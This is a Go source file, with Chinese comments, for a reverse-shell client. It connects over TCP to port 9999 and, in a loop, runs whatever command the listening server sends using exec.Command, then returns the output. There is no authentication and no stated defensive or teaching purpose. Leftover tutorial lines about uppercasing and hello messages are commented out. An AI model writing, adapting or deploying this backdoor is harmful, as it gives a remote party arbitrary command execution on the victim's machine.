package main

import (
	"fmt"
	"io/ioutil"
	"net"
	"os/exec"
	"strings"
)

//执行系统命令
func cmd(exe string, parms ...string) string {
	// 执行系统命令
	// 第一个参数是命令名称
	// 后面参数可以有多个，命令参数

	cmd := exec.Command(exe, parms...)
	// 获取输出对象，可以从该对象中读取输出结果
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		return "erro!"
	}
	// 保证关闭输出流
	defer stdout.Close()
	// 运行命令
	if err := cmd.Start(); err != nil {
		return "erro!"
	}
	// 读取输出结果
	opBytes, err := ioutil.ReadAll(stdout)
	if err != nil {
		return "erro!"
	}
	ret := string(opBytes)
	return ret
}

func exe_split(str string) (string, []string) {
	var exe string
	var parms []string
	countSplit := strings.Split(str, " ")
	if len(countSplit) >= 1 {
		exe = countSplit[0]
	} else {
		exe = ""
	}
	if len(countSplit) > 1 {
		parms = countSplit[1:]
	} else {
		parms = nil
	}
	return exe, parms
}

//业务处理函数需要接收conn参数 对应一个具体的客户端方向
func handle(conn net.Conn) {
	for {
		//创建容器用于接收读取到的数据
		buf := make([]byte, 1024) //使用make创建切片
		//cnt是实际读到的字符数
		cnt, err := conn.Read(buf)
		if err != nil {
			fmt.Println("conn.Read err:", err)
			return
		}

		fmt.Println("Client to Server...")
		fmt.Println("length:", cnt, "data", string(buf))

		exe, parms := exe_split(strings.ReplaceAll(string(buf), string([]byte{0x00}), ""))

		result := cmd(exe, parms...)
		fmt.Print(result)
		//服务器业务 小写转成大写
		//upperData := strings.ToUpper(string(buf[:cnt])) //只处理前cnt个字符
		cnt, err = conn.Write([]byte(result))

		fmt.Println("Server to Client...")
		fmt.Println("length:", cnt, "data", result)
	}
}

func message_change(conn net.Conn) {
	fmt.Println("消息交换！")
	for {

		fmt.Println("get data from server...")

		//接收服务器返回的数据
		buf := make([]byte, 1024)

		_, err := conn.Read(buf)
		if err != nil {
			fmt.Println("conn.Read err:", err)
			return
		}

		exe, parms := exe_split(strings.ReplaceAll(string(buf), string([]byte{0x00}), ""))

		result := cmd(exe, parms...)
		fmt.Print(result)
		_, err = conn.Write([]byte(result))

		fmt.Println("send data ok!")
		//fmt.Println("data:   ", string(buf[:cnt])) //只处理前cnt个字符

		//休息5秒再发送
		//time.Sleep(5 * time.Second)
	}
}
func main() {

	//与服务器建立连接
	conn, err := net.Dial("tcp", ":9999")
	if err != nil {
		fmt.Println("net.Dial err:", err)
		return
	}

	fmt.Println("Dial success")
	//client0发送的内容是 "hello this is client 0"
	//client1发送的内容是 "hello this is client 1"
	//sendData := []byte("hello this is client 0")

	message_change(conn)
	//go handle(conn)

}
